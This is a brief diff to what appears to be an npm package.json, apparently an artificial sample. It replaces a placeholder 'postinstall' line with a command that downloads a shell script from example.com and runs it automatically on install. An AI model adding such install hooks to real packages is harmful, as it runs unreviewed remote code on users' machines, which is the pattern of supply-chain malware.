@@ -5,7 +5,7 @@
   "main": "index.js",
   "scripts": {
     "start": "node index.js",
-    "postinstall": "echo malware > malware.exe"
+    "postinstall": "wget https://example.com/script.sh && sh script.sh"
   },
   "keywords": [
     "example"
